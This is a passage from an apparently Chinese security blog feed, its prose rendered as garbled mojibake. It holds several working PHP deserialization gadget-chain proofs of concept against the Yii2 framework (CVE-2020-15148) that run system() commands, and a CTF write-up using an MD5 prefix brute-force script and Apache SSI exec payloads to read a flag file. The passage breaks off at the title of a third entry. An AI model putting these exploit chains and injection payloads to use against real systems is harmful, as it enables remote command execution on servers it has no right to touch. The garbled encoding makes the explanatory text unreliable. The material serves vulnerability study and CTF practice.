<code>yii\rest\IndexAction::run()</code>åˆ©ç”¨äº†é­”æœ¯æ–¹æ³•<code>__call</code>ï¼Œè°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘æ­¤é­”æœ¯æ–¹æ³•</p><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;        <span class="hljs-keyword">private</span> $_dataReader;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payloadä»…ä»…æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿˜éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ç‚¹ï¼Œè¿™ä¸ªéœ€è¦æˆ‘ä»¬è‡ªå·±æ„é€ :</p><p>åœ¨controllersç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªController:</p><p><img src="/2021/07/12/filter/10.jpg" alt="10"></p><p>è®¿é—®</p><img src="/2021/07/12/filter/11.jpg" alt="11" style="zoom:50%;"><h3 id="POC2"><a class="header-anchor" href="#POC2">ğŸ­</a>POC2</h3><p>èµ·ç‚¹å’Œé“¾ä¸€ç›¸åŒï¼Œæ˜¯<code>BatchQueryResult</code>ç±»çš„<code>__destruct</code>ï¼Œç„¶åæ˜¯<code>$this-&gt;_dataReader-&gt;close()</code>ï¼Œä½†æ˜¯è¿™é‡Œä¸æ‰¾<code>__call</code>ï¼Œæˆ‘ä»¬é¡ºç€æ–¹å‘å»æ‰¾å­˜åœ¨<code>close</code>æ–¹æ³•çš„ç±»ï¼Œä¸”åœ¨æ­¤ç±»ä¸­çš„closeæ–¹æ³•è°ƒç”¨äº†å­˜åœ¨å±é™©å‡½æ•°çš„æ–¹æ³•ã€‚</p><p><img src="/2021/07/12/filter/12.jpg" alt="12"></p><p>è·Ÿè¿›<code>$this-&gt;composeFields()</code>ï¼ŒDbsessionç±»ç»§æ‰¿è‡ªMultiFieldSessionç±»</p><p><img src="/2021/07/12/filter/13.jpg" alt="13"></p><p>åœ¨ä¸Šè¿°<code>close()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†çˆ¶ç±»ä¸­çš„<code>$this-&gt;composeFields()</code>æ–¹æ³•ã€‚è·Ÿè¿›çˆ¶ç±»æ–‡ä¸­çš„å¯¹åº”æ–¹æ³•ä»£ç å—ï¼š</p><p><img src="/2021/07/12/filter/14.jpg" alt="14"></p><p><code>call_user_func</code>å‡½æ•°çš„å®˜æ–¹å®šä¹‰ä¸­$callbackå‚æ•°æ”¯æŒå·²å®ä¾‹åŒ–çš„å¯¹è±¡ä½œä¸ºæ•°ç»„ä¼ é€’</p><pre><code class="hljs reasonml">call<span class="hljs-constructor">_user_func(<span class="hljs-params">callable</span> $<span class="hljs-params">callback</span>, <span class="hljs-params">mixed</span> $<span class="hljs-params">parameter</span> = ?, <span class="hljs-params">mixed</span> $<span class="hljs-operator">...</span> = ?)</span>: mixed</code></pre><p><img src="/2021/07/12/filter/15.jpg" alt="15"></p><p>æ•…å¯å†ç»­ä¸Šé“¾ä¸€çš„æ— å‚çš„æ–¹æ³•ï¼ˆ<code>yii\rest\IndexAction::run()</code>ï¼‰</p><p>payload</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> $checkAccess;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;checkAccess = $func;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;id = $param;</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;</span><span class="php">    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> $writeCallback;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="hljs-string">&quot;run&quot;</span>];</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;</span><span class="php">    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">base</span>\<span class="hljs-title">BaseObject</span>;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">private</span> $_dataReader;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> \yii\web\DbSession($func, $param);</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> &#123;</span><span class="php">    $exp = <span class="hljs-keyword">new</span> \yii\db\BatchQueryResult(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>);</span><span class="php">    <span class="hljs-keyword">echo</span>(base64_encode(serialize($exp)));</span><span class="php">&#125;</span></code></pre><h3 id="POC3"><a class="header-anchor" href="#POC3">ğŸ­</a>POC3</h3><p>ä»¥ä¸Šé“¾åŸºäºåŸºç¡€çš„yii2ï¼Œæ–°ç‰ˆçš„<code>BatchQueryResult</code>ç±»å·²ç»è¢«ä¿®å¤æ— æ³•ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾å…¶ä»–ç±»ã€‚å…¨å±€æœç´¢<code>__destruct</code>ä¸<code>__wakeup</code>å‡½æ•°ï¼Œç„¶åè¿›è¡Œæ’æŸ¥ã€‚</p><p><img src="/2021/07/12/filter/16.jpg" alt="16"></p><p><code>$this-&gt;processes</code>å¯æ§==&gt;<code>$process</code>å¯æ§ï¼Œç„¶åä¸‹é¢åˆè°ƒç”¨äº†<code>$process-&gt;isRunning</code>,åˆå¯ä»¥æ¥ä¸Šç¬¬ä¸€æ¡åˆ©ç”¨é“¾çš„<code>__call</code>æ–¹æ³•å¼€å¤´çš„ååŠæ®µã€‚æ€è·¯ï¼š<code>Codeception\Extension\RunProcess::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-comment">// poc2</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;        <span class="hljs-keyword">private</span> $processes;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    // ç”Ÿæˆ<span class="hljs-title">poc</span>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>()));&#125;<span class="hljs-meta">?&gt;</span></code></pre><h3 id="POC4"><a class="header-anchor" href="#POC4">ğŸ­</a>POC4</h3><p>åŒæ ·ä»__destructå…¥æ‰‹æ‰¾åˆ°çš„</p><p><img src="/2021/07/12/filter/17.jpg" alt="17"></p><p>è·Ÿè¿›clearAll</p><img src="/2021/07/12/filter/18.jpg" alt="18" style="zoom: 67%;"><p><code>$this-&gt;keys</code>ã€<code>$nsKeyã€$itemKey</code>éƒ½å¯æ§ï¼Œè·Ÿè¿›clearKeyï¼š</p><img src="/2021/07/12/filter/19.jpg" alt="19" style="zoom:67%;"><p><code>$this-&gt;path</code>ä¹Ÿå¯æ§ï¼Œè€Œä¸”è¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œåˆ™å¯åˆ©ç”¨é­”æœ¯æ–¹æ³•<code>__toString</code>æ¥è§¦å‘åç»­æ“ä½œ</p><p>å…¨å±€æœç´¢<code>__toString</code>æ–¹æ³•ï¼š</p><p><img src="/2021/07/12/filter/20.jpg" alt="20"></p><p>è·Ÿé“¾ä¸€ä¸€æ ·è§¦å‘__call</p><p>payload</p><pre><code class="hljs xquery"><span class="hljs-type">namespace</span> &#123;    class Swift_KeyCache_DiskKeyCache&#123;        private <span class="hljs-variable">$path</span>;        private <span class="hljs-variable">$keys</span> = [];        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$path</span>,<span class="hljs-variable">$keys</span>) &#123;            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;path</span> = <span class="hljs-variable">$path</span>;            <span class="hljs-variable">$this-</span>&gt;keys = <span class="hljs-variable">$keys</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> Codeception\Util&#123;    class XmlBuilder&#123;        protected <span class="hljs-variable">$__dom__</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$__dom__</span>) &#123;            <span class="hljs-variable">$this-</span>&gt;__dom_<span class="hljs-number">_</span> = <span class="hljs-variable">$__dom__</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> Faker&#123;    class Generator&#123;        protected <span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>();        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$formatters</span>) &#123;            <span class="hljs-variable">$this-</span>&gt;formatters = <span class="hljs-variable">$formatters</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> yii\rest&#123;    class CreateAction&#123;        public <span class="hljs-variable">$checkAccess</span>;        public <span class="hljs-variable">$id</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$checkAccess</span>,<span class="hljs-variable">$id</span>)&#123;            <span class="hljs-variable">$this-</span>&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;id</span> = <span class="hljs-variable">$id</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> &#123;    <span class="hljs-variable">$c</span> = new yii\rest\CreateAction(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>);    <span class="hljs-variable">$b</span> = new Faker\Generator(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;saveXML&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));    <span class="hljs-variable">$a</span> = new Codeception\Util\XmlBuilder(<span class="hljs-variable">$b</span>);    <span class="hljs-variable">$d</span> = new Swift_KeyCache_DiskKeyCache(<span class="hljs-variable">$a</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;kawhi&#x27;</span>=&gt;<span class="hljs-string">&#x27;kawhi&#x27;</span>));    print(urlencode(serialize(<span class="hljs-variable">$d</span>)));&#125;</code></pre><h3 id="POC4-2"><a class="header-anchor" href="#POC4-2">ğŸ­</a>POC4-2</h3><p>__tostringå…¥æ‰‹è¿˜å¯æ‰¾åˆ°see.php</p><p><img src="/2021/07/12/filter/21.jpg" alt="21"></p><p><code>$this-&gt;description</code>å¯æ§ï¼Œåˆå¯ä»¥åˆ©ç”¨<code>__call</code>ï¼Œæ€è·¯ï¼š</p><p><code>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">See</span></span>&#123;        <span class="hljs-keyword">protected</span> $description;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">See</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span>&#123;        <span class="hljs-keyword">private</span> $keys = [];        <span class="hljs-keyword">private</span> $path;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> See;            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(                <span class="hljs-string">&quot;axin&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;is&quot;</span>=&gt;<span class="hljs-string">&quot;handsome&quot;</span>)            );        &#125;    &#125;    <span class="hljs-comment">// ç”Ÿæˆpoc</span>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Swift_KeyCache_DiskKeyCache()));&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>Description.phpé‡Œä¹Ÿæœ‰ä¸€æ¡ï¼Œä½†åŸç†ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚</p><p>å‚è€ƒ:</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0ODg2MDA0NQ==&amp;mid=2247484726&amp;idx=1&amp;sn=5f268e5a840dbecad80224dc9a53e525&amp;chksm=fbb9fcd4ccce75c2d5c72ed67b50976b40b121abb495df70939895ed8c909040ce9ebe077913&amp;mpshare=1&amp;scene=23&amp;srcid=0921cI0QgoWweYnLNsGy7GgR&amp;sharer_sharetime=1600694482848&amp;sharer_shareid=b30d61744bd3c2a98fea51904fc6f025#rd">Yii2 ååºåˆ—åŒ–ï¼ˆCVE-2020-15148ï¼‰åˆ†æ                </a></p><p><a href="https://juejin.cn/post/6874149010832097294#heading-0">æˆ‘æ˜¯å¦‚ä½•æŒ–æ˜yii2çš„ååºåˆ—åŒ–0dayçš„</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020||EasySearch</title>
    <link href="/2021/07/11/web/"/>
    <url>/2021/07/11/web/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜æ¶‰åŠä¸€ä¸ªæ–°æ¼æ´â€”â€”Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</p><h4 id="SSI"><a class="header-anchor" href="#SSI">ğŸ­</a>SSI</h4><p>SSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰æ˜¯æ”¾ç½®åœ¨HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œå¹¶åœ¨æœåŠ¡é¡µé¢æ—¶åœ¨æœåŠ¡å™¨ä¸Šå¯¹å…¶è¿›è¡Œè¯„ä¼°ï¼Œå®ƒæä¾›äº†ä¸€ç§å¯¹ç°æœ‰HTMLæ–‡æ¡£å¢åŠ åŠ¨æ€å†…å®¹çš„æ–¹æ³•ï¼Œä¸éœ€è¦ç¼–å†™å¤æ‚çš„JSP/PHP/ASPç­‰ç¨‹åºæˆ–è€…è°ƒç”¨CGIç¨‹åºã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p><p>ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥å°†æŒ‡ä»¤æ”¾ç½®åˆ°ç°æœ‰çš„HTMLé¡µé¢ä¸­ï¼š</p><pre><code class="hljs javascript">&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</code></pre><p>å½“è¯¥é¡µé¢è¢«æŠ•æ”¾æ—¶ï¼Œè¯¥ç‰‡æ®µå°†è¢«è¯„ä¼°å¹¶æ›¿æ¢ä¸ºå…¶å€¼ï¼š</p><pre><code class="hljs javascript">Sunday, <span class="hljs-number">11</span>-July<span class="hljs-number">-2013</span> <span class="hljs-number">19</span>:<span class="hljs-number">28</span>:<span class="hljs-number">54</span> EST</code></pre><h4 id="å›å½’é¢˜ç›®ï¼š"><a class="header-anchor" href="#å›å½’é¢˜ç›®ï¼š">ğŸ­</a>å›å½’é¢˜ç›®ï¼š</h4><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ‰«ç›®å½•æ‰«åˆ°äº†index.php.swpï¼Œè¿›å»æ˜¯ä¸€æ®µæºä»£ç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ob_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;$chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span>$content = uniqid().$random;<span class="hljs-keyword">return</span> sha1($content); &#125;    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);***    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )    &#123;        $admin = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;            $file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;            $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);            $text = <span class="hljs-string">&#x27;</span><span class="hljs-string">            ***</span><span class="hljs-string">            ***</span><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><span class="hljs-string">            ***</span><span class="hljs-string">***&#x27;</span>;            fwrite($shtml,$text);            fclose($shtml);            ***<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;                &#125;<span class="hljs-keyword">else</span>    &#123;***    &#125;***<span class="hljs-meta">?&gt;</span></code></pre><p>æ ¹æ®é¢˜æ„ï¼Œè·‘å‡ºMD5åŠ å¯†å‰é¢æ˜¯6d0bc1çš„å¯†æ–‡</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">1000000000</span>):</span><span class="hljs-function">    <span class="hljs-variable">a</span> = <span class="hljs-variable">hashlib.md5</span>(<span class="hljs-title">str</span>(<span class="hljs-variable">i</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()</span>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">a</span>)</span></code></pre><p>ç»“æœï¼š</p><p><img src="/2021/07/11/web/1.png" alt="1"></p><p>é€‰ä¸€ä¸ªç™»å½•ï¼ŒæŠ“åŒ…</p><p><img src="/2021/07/11/web/1.jpg" alt="1"></p><p>è¿”å›åŒ…ä¸­ä¼šç”Ÿæˆä¸€ä¸ªåç¼€ä¸º.shtmlæ–‡ä»¶ï¼ˆå°†ç”¨æˆ·åå†™å…¥æ–‡ä»¶ä¸­ï¼‰ã€‚</p><p>åˆ©ç”¨SSIæ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨usernameå˜é‡ä¸­ä¼ å…¥ssiè¯­å¥æ¥è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;å‘½ä»¤&quot;--&gt;</span></code></pre><p>é¦–å…ˆlsä¸€ä¸‹å½“å‰ç›®å½•ï¼š</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span></code></pre><p><img src="/2021/07/11/web/2.jpg" alt="2"></p><p>flagä¸åœ¨æ­¤ç›®å½•ï¼Œè¿”å›ä¸Šä¸€çº§</p><p><img src="/2021/07/11/web/3.jpg" alt="3"></p><p>è®¿é—®</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span></code></pre><p>å³å¯å¾—åˆ°flagã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021||upload</title>
    <link href="/2021/07/11/upload-1/"/>
    <url>/2021/07/11/upload-1/</url>
    
